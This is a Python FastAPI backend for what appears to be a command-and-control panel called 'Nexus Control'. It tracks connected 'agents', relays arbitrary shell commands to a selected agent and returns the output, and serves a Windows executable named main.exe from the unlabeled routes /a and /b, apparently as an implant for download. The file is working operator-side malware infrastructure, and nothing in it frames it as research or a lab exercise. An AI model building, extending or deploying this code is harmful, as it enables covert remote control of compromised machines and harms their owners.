import utils
from contextlib import asynccontextmanager
from typing import List
from fastapi import FastAPI, HTTPException, Query
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from db.engine import Engine
from db.models import agents_table, agent_id as agent_id_field
from db.query import Create, Select, Update
from server import Server
from config import Config
from logs import load_logs, logger
from models import ServerStatus, ServerStats, AgentData, AgentResponse

# Global instances
engine: Engine | None = None
server: Server | None = None


@asynccontextmanager
async def lifespan(app: FastAPI):

    global server, engine

    # Init DB
    engine = Engine()
    init_db()

    # Start server
    server = Server(Engine)
    server.start(Config.HOST, Config.PORT)

    yield

    # Stop server
    server.stop()

    # Close DB
    engine.commit()
    engine.close()
    logger.info("Server successfully stopped.")

def init_db() -> None:
    global engine
    engine.open(Config.DB_PATH)
    create = Create(agents_table, exists_ok=True)
    engine.execute(create)
    engine.commit()

    logger.info("Database initialized.")

app = FastAPI(
    title=Config.API_TITLE,
    version=Config.API_VERSION,
    lifespan=lifespan
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=Config.ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/server/status", response_model=ServerStatus)
async def get_server_status():

    return ServerStatus(
        is_running=server.is_running,
        port=server.port,
        host=server.host,
    )

@app.get("/server/stats", response_model=ServerStats)
async def get_server_stats():
    utils.update()
    return ServerStats(
        hostname=utils.hostname,
        local_ip=utils.local_ip,
        public_ip=utils.public_ip,
        mac_address=utils.mac_address,

        cpu_usage=utils.cpu_usage,
        memory_usage=utils.memory_usage,
        network_download_kbps=utils.network_download_kbps,
        network_upload_kbps=utils.network_upload_kbps,

        max_connections=server.MAX_CONNECTIONS,
        encryption=True,
        os_name=utils.os_name,
        os_version=utils.os_version,
        os_architecture=utils.os_architecture,
        server_time=utils.server_time,
        server_start_time=utils.server_start_time,
    )

@app.post("/server/control")
async def control_server(action: str):

    if action == "start":
        server.start(Config.HOST, Config.PORT)
        return {"message": "Server started successfully", "action": "start"}
    elif action == "stop":
        server.stop()
        return {"message": "Server stopped successfully", "action": "stop"}
    else:
        raise HTTPException(status_code=400, detail="Invalid action")

@app.get("/agents", response_model=List[AgentData])
async def get_agents() -> List[AgentData]:

    select_query = Select(agents_table).all()
    result = engine.execute(select_query)

    agents_list = [AgentData.model_validate(row) for row in result]
    return agents_list

@app.get("/agents/{agent_id}", response_model=AgentData)
async def get_agent(agent_id: str) -> AgentData:

    select_query = Select(agents_table).all()
    result = engine.execute(select_query)

    for row in result:
        agent = AgentData.model_validate(row)
        if agent.agent_id == agent_id:
            return agent

    raise HTTPException(status_code=404, detail="Agent not found")

@app.post("/agents/interaction", response_model=AgentResponse)
async def agent_interaction(agent_id: str, command: str) -> AgentResponse:
    try:
        response: dict = server.interact_with_agent(agent_id, command)
        return AgentResponse(status=response["status"], command_response=response["response"], cwd=response["cwd"])
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/agents/{agent_id}")
async def update_agent_name(agent_id: str, name: str):

    try:
        update = Update(agents_table).set({"name": name}).where(agent_id_field == agent_id)
        engine.execute(update)
        engine.commit()
        logger.info(f"Database updated agent name to {name}.")

        return {"message": "Agent updated successfully", "agent_id": agent_id}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

# Download PE file
@app.get("/a")
async def get_pe_file_download():

    return FileResponse(
        Config.PE_FILE_PATH,
        media_type="application/octet-stream",
        filename="main.exe"
    )

# Download regular file
@app.get("/b")
async def get_regular_file_download():

    return FileResponse(
        Config.REGULAR_FILE_PATH,
        media_type="application/octet-stream",
        filename="main.exe"
    )

@app.get("/health")
async def health_check():

    return {
        "status": "healthy", 
        "message": "Nexus Control API is running"
    }

@app.get("/logs")
async def get_logs(limit: int = Query(20, ge=1)):
    return load_logs(limit)


app.mount("/", StaticFiles(directory=Config.FRONTEND_BUILD_PATH, html=True), name="static")
